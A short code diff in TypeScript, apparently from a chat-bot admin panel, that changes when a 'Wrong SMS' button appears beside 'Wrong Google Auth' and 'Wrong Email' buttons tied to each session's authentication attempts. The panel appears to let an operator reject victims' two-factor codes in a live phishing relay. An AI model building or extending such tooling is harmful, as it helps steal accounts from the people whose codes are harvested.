@@ -670,14 +670,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     console.log("✅ Added Wrong Google Auth button");
   }
 
-  // Wrong SMS button - only if user attempted SMS at least once
-  if (session.authAttempts["sms"] && session.authAttempts["sms"] > 0) {
-    wrongButtonsRow2.push({
-      text: "❌ Wrong SMS",
-      callback_data: `incorrect_sms_${sessionId}`,
-    });
-    console.log("✅ Added Wrong SMS button");
-  }
+  // Wrong SMS button moved to main buttons section to be always available
 
   // Wrong Email button - only if user attempted email at least once
   if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
